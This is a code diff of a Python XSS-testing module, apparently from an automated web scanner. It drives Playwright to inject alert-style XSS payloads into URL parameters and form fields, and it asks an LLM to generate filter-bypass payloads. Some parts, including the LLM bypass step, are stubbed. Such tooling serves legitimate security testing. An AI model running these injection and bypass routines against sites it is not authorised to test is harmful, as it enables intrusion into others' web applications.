@@ -1,277 +1,257 @@
-# 导入必要的类型和结构
-import uuid
-from typing import Dict, Any, List, Optional
-
-from analysis.owasp_llm_analyzer import PotentialIssue
+from typing import Dict, Optional, List
+from script.scanner.page_asset import SiteAsset, InputField
+from script.attacker.payload.a03_xss_payload import XSSPayloadLib
+from script.analysis.owasp_llm_analyzer import PotentialIssue
 from attacker.attack_target import AttackResult
-from attacker.payload.a03_xss_payload import XSSPayloadLib
-from scanner.page_asset import InputField, SiteAsset
-from attacker.attack_strategy import AttackStrategy
 
 
-# 确保您可以访问 Playwright 或 HTTP 客户端
-# from playwright.sync_api import Page
-# from attack_tools import get_session_client # 假设这是一个获取客户端的函数
-
-class XSSAttacker(AttackStrategy):
-    """
-    负责执行 XSS 攻击策略。
-    主要流程：通用载荷测试 -> LLM分析过滤 -> LLM生成绕过载荷 -> 确认执行。
-    """
-
-    def __init__(self, llm_proxy: Any):
-        """初始化，传入 LLM 代理。"""
-        super().__init__(llm_proxy)
-
-        # 基础 XSS 探测载荷
-        self.basic_payloads: List[str] = [
-            "<script>alert(1)</script>",  # 经典标签
-            "\"'onload=prompt(1)>",  # 事件注入 (针对属性)
-            "javascript:prompt(1)",  # 伪协议 (针对 href)
-            "<svg/onload=prompt(1)>",  # 无需 <script> 标签
-        ]
+class XSSAttacker:
+    def __init__(self, llm_proxy):
+        # self.context = context  # Playwright BrowserContext
+        self.llm_proxy = llm_proxy
 
     def exploit(self, issue: PotentialIssue, site_asset: SiteAsset, session_context: Dict) -> AttackResult:
         """
-        执行 XSS 攻击 (集成 4 梯队 Payload 策略)。
+        基于 LLM 分析结果执行 XSS 攻击。
+        支持两种策略：
+        1. 导航注入 (Navigation Attack): 修改 URL 参数 (GET 请求)
+        2. DOM 交互 (DOM Interaction): 填写表单并提交
         """
-
-        # # -------------------------------------------------------------
-        # # 0. 目标解析 (Resolution) - 这一步必须保留，否则无法操作页面
-        # # -------------------------------------------------------------
-        # target_input: Optional[InputField] = None
-        #
-        # if issue.related_input_id is not None:
-        #     target_input = self._find_input_by_id(site_asset, issue.related_input_id)
-        #
-        # if not target_input:
-        #     # 如果找不到 Input，且没有 API URL，就没法打
-        #     return AttackResult(
-        #         success=False,
-        #         vulnerability_type='XSS',
-        #         severity="Info",
-        #         proof_of_concept='',
-        #         request_snapshot={},
-        #         response_snapshot="",
-        #         details=f"Target InputField (ID: {issue.related_input_id}) not found."
-        #     )
-
-        print(f"[*] Starting XSS attack on {issue.url}")
-
-        # -------------------------------------------------------------
-        # 1. 上下文推断 (Context Inference)
-        # -------------------------------------------------------------
-        # 简单的启发式逻辑：看 issue 的描述里有没有暗示 "attribute", "value", "href" 等
-        # 如果不确定，默认为 'html'，但在 get_payloads('html') 里我们也包含了一些属性 payload 作为兜底
-        context_type = "html"
-        loc_str = (issue.location + issue.risk_reason).lower()
-
-        if "attribute" in loc_str or "input value" in loc_str or "href" in loc_str:
-            context_type = "attribute"
-
-        print(f"[*] Inferred Context: {context_type}")
-
-        # -------------------------------------------------------------
-        # Phase 1: 静态 Payload 轰炸 (Tier 1, 2, 3)
-        # -------------------------------------------------------------
-        # 这里获取的是已经排序好的列表：Polyglots -> Modern -> Legacy
-        static_payloads = XSSPayloadLib.get_payloads(context=context_type)
-
-        print(f"[*] Testing {len(static_payloads)} static payloads (Tiers 1-3)...")
-
-        for payload in static_payloads:
-            # _test_payload 内部负责：填入输入 -> 提交 -> 监听弹窗/检查回显
-            if self._test_payload(target_input, payload, session_context):
-                return AttackResult(
-                    success=True,
-                    vulnerability_type='XSS',
-                    severity="High",  # 弹窗成功就是 High
-                    proof_of_concept=payload,
-                    request_snapshot={},  # 需在 _test_payload 里捕获
-                    response_snapshot="",
-                    details=f"Success with static payload ({context_type} context)."
-                )
-
-        # -------------------------------------------------------------
-        # Phase 2: LLM 智能绕过 (Tier 4)
-        # -------------------------------------------------------------
-        print("[*] Static payloads failed. Engaging LLM for mutation analysis (Tier 4)...")
-
-        # 1. 指纹探测 (Fingerprinting)
-        # 发送一个包含特殊字符的探测包，看看谁被过滤了
-        fingerprint_payload = "<script/xss_test>alert(1);\"'</script>"
-        response_data, response_html = self._send_and_capture_response(
-            target_input, fingerprint_payload, session_context
-        )
-
-        if not response_data:
-            return AttackResult(
-                success=False,
-                vulnerability_type='XSS',
-                severity="Info",
-                proof_of_concept='',
-                request_snapshot={},
-                response_snapshot="",
-                details="Failed to get valid response for analysis."
+        # Ensure we have the browser context
+        if 'playwright_page' in session_context:
+            self.context = session_context['playwright_page'].context
+        else:
+             return AttackResult(
+                success=False, vulnerability_type='XSS', severity="Error",
+                proof_of_concept='', details="Missing playwright_page in session_context"
             )
 
-        # 2. 准备 LLM 上下文
-        print("[*] Consulting LLM to generate custom bypass payloads...")
-
-        llm_context = {
-            "target_url": target_input.page_url,
-            "target_field_name": target_input.name,
-            "field_selector": target_input.css_selector,
-            "reflected_response_html": response_html,  # 让 LLM 看到过滤后的样子
-            "failed_payload": fingerprint_payload,
-
-            # [关键]：传入 Analysis 阶段的洞察
-            "risk_analysis": issue.risk_reason,
-            "analyzer_suggestions": issue.suggested_tests,
-
-            # [关键]：传入 Tier 4 变异策略知识库
-            "available_mutation_strategies": XSSPayloadLib.get_mutation_strategies()
-        }
-
-        # 3. LLM 生成 Payload
-        # 这里假设 self.utils.generate_xss_bypass 会利用上面的 strategies 生成变异体
-        llm_generated_payloads: List[str] = self.llm.generate_xss_bypass(llm_context)
-        print(f"[*] LLM generated {len(llm_generated_payloads)} mutation payloads.")
-
-        # 4. 测试 LLM 生成的载荷
-        for payload in llm_generated_payloads:
-            if self._test_payload(target_input, payload, session_context):
-                return AttackResult(
-                    success=True,
-                    vulnerability_type='XSS',
-                    severity="High",
-                    proof_of_concept=payload,
-                    request_snapshot={},
-                    response_snapshot="",
-                    details="XSS successfully bypassed filters using LLM-generated payload."
-                )
-
-        # -------------------------------------------------------------
-        # Phase 3: 最终失败
-        # -------------------------------------------------------------
-        return AttackResult(
-            success=False,
-            vulnerability_type='XSS',
-            severity="Low",
-            proof_of_concept='',
-            request_snapshot={},
-            response_snapshot="",
-            details="All XSS attempts failed, including Tier 1-4 strategies."
-        )
-
-    def _send_and_capture_response(self, target: InputField, payload: str, context: Dict) -> tuple[
-        Optional[Dict], Optional[str]]:
-        """
-        发送载荷，返回请求和响应数据。
-        这部分逻辑需要依赖 Playwright/Requests 客户端，它应该从 session_context 中获取。
-        """
-        # 假设 context['client'] 是 Playwright Page 或 Requests Session
-        # client = context.get('client')
-        # if not client: return None, None
-
-        # 1. 构造请求：将载荷注入到目标字段
-        # ... (根据 target.page_url, target.name, target.css_selector 构造请求)
-
-        # 2. 发送请求并获取响应
-        # response = client.request(method='GET/POST', url=target.page_url, data/params={target.name: payload})
-
-        # 3. 提取核心数据
-        response_data = {"status": 200, "headers": {}, "body_snapshot": "..."}  # 假设提取了部分数据
-        response_html = "<html>...反射载荷后的HTML...</html>"  # 假设这是渲染后的HTML
-
-        return response_data, response_html
-
-    def _test_payload(self, target: InputField, payload: str, context: Dict) -> bool:
-        """
-        发送载荷，并检查 XSS 是否被成功执行。
-
-        这是 XSS 攻击中最难的自动化部分，需要确认载荷是否：
-        1. 成功反射到 DOM 中 (反射型/存储型)
-        2. 被浏览器解析并执行 (DOM XSS/其他)
-        """
-        response_data, response_html = self._send_and_capture_response(target, payload, context)
-
-        if not response_html:
-            return
-
-    def get_prioritized_payloads(self, context_type: str) -> List[str]:
-        payloads = []
-
-        # 1. 先来几个 Polyglots，试图乱拳打死老师傅
-        payloads.extend(self.load_polyglots())
-
-        # 2. 根据上下文加载现代 Payload (命中率最高)
-        if context_type == "html":
-            payloads.extend(self.load_modern_tags())
-        elif context_type == "attribute":
-            payloads.extend(self.load_attribute_breakers())
-
-        # 3. 最后加载 Legacy Payloads (包括 iframe javascript 伪协议)
-        # 用来检测服务端的过滤底线
-        payloads.extend(self.load_legacy_payloads())
-
-        return payloads
-
-    def detect_reflection(self, target_input, session_context):
-        """
-        探测回显逻辑：
-        1. 发送包含特殊字符的随机 Token
-        2. 检查响应中是否存在该 Token
-        3. 检查 Token 是否被转义
-        """
-        # 1. 生成金丝雀 (Canary)
-        # 包含 XSS 必须的特殊字符：单引号、双引号、尖括号
-        canary_token = f"pt_{uuid.uuid4().hex[:6]}"
-        probe_payload = f"{canary_token}<'\""
-
-        # 2. 发送请求
-        # 这里复用你之前的 _send_and_capture_response
-        response_data, response_html = self._send_and_capture_response(
-            target_input, probe_payload, session_context
-        )
-
-        if not response_html:
-            return None
-
-        # 3. 检查回显
-        if canary_token not in response_html:
-            # 根本没回显，直接 Pass，省下了调用 LLM 的钱
-            print(f"[-] No reflection found for {target_input.name}")
-            return None
-
-        # 4. 检查转义情况 (简单判断)
-        is_vulnerable = False
-        context = "unknown"
-
-        # 检查是否原样返回了特殊字符
-        if f"{canary_token}<'\"" in response_html:
-            is_vulnerable = True
-            print(f"[+] Found RAW reflection! Vulnerable candidate.")
-        elif f"{canary_token}&lt;" in response_html:
-            print(f"[-] Reflection found but HTML encoded (Safe).")
-            # 除非你有专门绕过编码的手段，否则通常认为安全
-            return None
-
-            # 5. 简单确定上下文 (Python 粗略判断，LLM 精细判断)
-        # 找到 token 在 html 中的位置索引
-        idx = response_html.find(canary_token)
-        # 取 token 前面 20 个字符看看
-        prefix = response_html[max(0, idx - 20):idx]
-
-        if '="' in prefix or "='" in prefix:
-            context = "attribute"
-        elif '<script' in prefix:
-            context = "script"
+        print(f"[*] Analyzing Issue: {issue.owasp_category} at {issue.location}")
+        
+        # ---------------------------------------------------
+        # 1. 注入载体识别 (Vector Identification)
+        # ---------------------------------------------------
+        # 检查 URL 是否包含查询参数 (e.g. ?q=)
+        url_has_params = "?" in issue.url and "=" in issue.url
+        
+        # 尝试还原 InputField
+        target_input: Optional[InputField] = None
+        if issue.related_input_id is not None:
+            for page in site_asset.pages.values():
+                for inp in page.inputs:
+                    if inp.internal_id == issue.related_input_id:
+                        target_input = inp
+                        break
+                if target_input: break
+        
+        if target_input:
+            print(f"[*] Target resolved: {target_input.tag} name='{target_input.name}' on {target_input.page_url}")
         else:
-            context = "html"
+            print(f"[*] No specific input field resolved for ID {issue.related_input_id}.")
 
-        return {
-            "is_vulnerable": is_vulnerable,
-            "context": context,
-            "reflection_snippet": response_html[max(0, idx - 50):idx + 50]  # 截取一段给 LLM 看
+        # ---------------------------------------------------
+        # 2. 准备 Payloads
+        # ---------------------------------------------------
+        # 简单起见，我们先混用 HTML 和 Attribute 上下文的 payload
+        # 或者根据情况判断。如果是 URL 注入，通常上下文比较宽松，或者需要 URL 编码
+        payloads = XSSPayloadLib.get_payloads(context="html") + XSSPayloadLib.get_payloads(context="attribute")
+        
+        page = self.context.new_page()
+        try:
+            # ---------------------------------------------------
+            # 3. 策略 A: 导航攻击 (Navigation Attack)
+            # ---------------------------------------------------
+            # 如果 URL 包含参数，或是明确的 GET 请求，优先尝试直接构造 URL
+            if url_has_params:
+                print(f"[*] Vector Identified: URL Parameters. Attempting Navigation Attack on {issue.url}")
+                result = self._attack_via_navigation(page, issue.url, payloads)
+                if result:
+                    return result
+            
+            # ---------------------------------------------------
+            # 4. 策略 B: DOM 交互攻击 (Interaction Attack)
+            # ---------------------------------------------------
+            if target_input:
+                print(f"[*] Vector Identified: Input Field. Attempting DOM Interaction Attack on {target_input.name}")
+                context_type = self._infer_context_type(target_input, issue)
+                # 重新获取针对该上下文优化的 payload，减少无效尝试
+                targeted_payloads = XSSPayloadLib.get_payloads(context=context_type)
+                
+                result = self._attack_via_dom_interaction(page, target_input, targeted_payloads)
+                if result:
+                    return result
+
+        except Exception as e:
+            print(f"[!] Attack Loop Error: {e}")
+        finally:
+            page.close()
+
+        # ---------------------------------------------------
+        # 5. Fallback: LLM Bypass (如果前面的静态尝试都失败)
+        # ---------------------------------------------------
+        # 只有在有 Input 对象时才尝试 bypass，或者你可以扩展逻辑支持 URL bypass
+        if target_input:
+            print("[*] Static payloads failed. Attempting LLM Bypass...")
+            # 注意：这里 _perform_llm_bypass 需要适配一下，它原本依赖 target_input
+            # 暂时保持原样，仅当 target_input 存在时调用
+            context_type = self._infer_context_type(target_input, issue)
+            return self._perform_llm_bypass(issue, target_input, context_type)
+
+        return AttackResult(
+            success=False, vulnerability_type='XSS', severity="Low",
+            proof_of_concept='', request_snapshot={}, response_snapshot="",
+            details="All injection strategies failed."
+        )
+
+    def _infer_context_type(self, target_input: InputField, issue: PotentialIssue) -> str:
+        """推断 DOM 注入点的上下文类型"""
+        context_type = "html"
+        if target_input.tag == "input" and target_input.input_type not in ["checkbox", "radio"]:
+            context_type = "attribute"
+        elif target_input.tag == "textarea":
+            context_type = "html"
+        
+        analysis_text = (str(issue.risk_reason) + str(issue.suggested_tests)).lower()
+        if "attribute" in analysis_text or "value" in analysis_text:
+            context_type = "attribute"
+        
+        for hint in issue.suggested_tests:
+            if '"> ' in hint or "'>" in hint or '" ' in hint:
+                context_type = "attribute"
+                break
+        return context_type
+
+    def _attack_via_navigation(self, page, base_url: str, payloads: List[str]) -> Optional[AttackResult]:
+        """
+        通过构造含有 Payload 的 URL 进行攻击 (针对 GET 参数)
+        """
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+        parsed = urlparse(base_url)
+        params = parse_qs(parsed.query, keep_blank_values=True)
+
+        if not params:
+            return None
+
+        # 针对每个参数尝试注入
+        for param_name in params.keys():
+            # 保存原始值
+            original_values = params[param_name]
+            
+            for payload in payloads:
+                # Debug Check for specific payload
+                if payload == r"<iframe src='javascript:alert(1)'></iframe>":
+                    print(f"[DEBUG] >>> Execution reached the specific iframe payload: {payload}")
+
+                # 构造恶意 Query
+                # 我们只替换当前遍历到的参数，其他参数保持原样 (或者你可以选择每个都替换)
+                # 这里简单策略：替换当前参数的第一个值
+                new_params = params.copy()
+                new_params[param_name] = [payload] # 替换为 payload
+                
+                # 重组 URL
+                new_query = urlencode(new_params, doseq=True)
+                target_url = urlunparse((
+                    parsed.scheme, parsed.netloc, parsed.path,
+                    parsed.params, new_query, parsed.fragment
+                ))
+
+                # 监听 & 访问
+                # 使用 wait_until='domcontentloaded' 可以显著加快速度，不必等待所有图片加载
+                # timeout=3000 (3秒) 给页面足够的执行 JS 时间，同时避免卡死
+                if self._check_alert(page, lambda: page.goto(target_url, timeout=3000, wait_until="domcontentloaded")):
+                    return AttackResult(
+                        success=True, vulnerability_type='XSS', severity="High",
+                        proof_of_concept=target_url, request_snapshot={}, response_snapshot="Alert Triggered",
+                        details=f"Navigation attack worked on param '{param_name}'"
+                    )
+        return None
+
+    def _attack_via_dom_interaction(self, page, target_input: InputField, payloads: List[str]) -> Optional[AttackResult]:
+        """
+        通过 DOM 操作 (fill, press) 进行攻击
+        """
+        # 必须先去目标页面
+        try:
+            page.goto(target_input.page_url)
+        except Exception:
+            return None
+
+        for payload in payloads:
+             # 定义触发动作：填入 + 回车
+            def trigger_action():
+                try:
+                    page.fill(target_input.css_selector, payload)
+                    page.press(target_input.css_selector, "Enter")
+                    page.wait_for_timeout(1000) # 等待执行
+                except Exception:
+                    pass
+
+            if self._check_alert(page, trigger_action):
+                return AttackResult(
+                    success=True, vulnerability_type='XSS', severity="High",
+                    proof_of_concept=payload, request_snapshot={}, response_snapshot="Alert Triggered",
+                    details=f"DOM interaction worked on input '{target_input.name}'"
+                )
+        return None
+
+    def _check_alert(self, page, trigger_func) -> bool:
+        """
+        通用辅助函数：执行 trigger_func 并监听弹窗
+        """
+        xss_triggered = False
+
+        def handle_dialog(dialog):
+            nonlocal xss_triggered
+            # 如果弹窗内容是 payload 里的数字 (如 '1') 或者 XSS 关键字，视为成功
+            if dialog.type == "alert" and (dialog.message == "1" or "xss" in str(dialog.message).lower()):
+                print(f"[+] XSS Alert Triggered! Content: {dialog.message}")
+                xss_triggered = True
+                dialog.accept()
+            else:
+                dialog.dismiss()
+
+        # 注册监听器
+        page.on("dialog", handle_dialog)
+        
+        try:
+            trigger_func()
+        except Exception:
+            pass
+        finally:
+            try:
+                page.remove_listener("dialog", handle_dialog)
+            except:
+                pass
+
+        return xss_triggered
+
+    def _perform_llm_bypass(self, issue, target_input, context_type) -> AttackResult:
+        """
+        发送探测包 -> 获取过滤后的响应 -> 喂给 LLM -> 生成新 Payload -> 测试
+        """
+        # 1. 发送探测指纹
+        fingerprint = "<script>alert(1)</script>\"'"
+        # ... (此处省略获取 response_html 的代码，可以使用 page.content() 获取当前 DOM) ...
+        # 假设我们拿到了 filter 后的 html
+        response_html_snippet = "..."
+
+        # 2. 构造 LLM Context
+        bypass_context = {
+            "target_url": target_input.page_url,
+            "input_element": str(target_input),
+            "original_risk_analysis": issue.risk_reason,
+            "llm_suggestions": issue.suggested_tests,
+            "failed_payload": fingerprint,
+            "server_response_snippet": response_html_snippet,  # 让 LLM 看到 payload 变成了什么
+            "mutation_strategies": XSSPayloadLib.get_mutation_strategies()
         }
+
+        # 3. 调用 LLM 生成
+        # new_payloads = self.llm.generate_bypass(bypass_context)
+
+        # 4. 再次测试 new_payloads ...
+
+        return AttackResult(success=False, vulnerability_type='XSS', severity="Low",
+                            proof_of_concept="", request_snapshot={}, response_snapshot="",
+                            details="LLM Bypass failed")
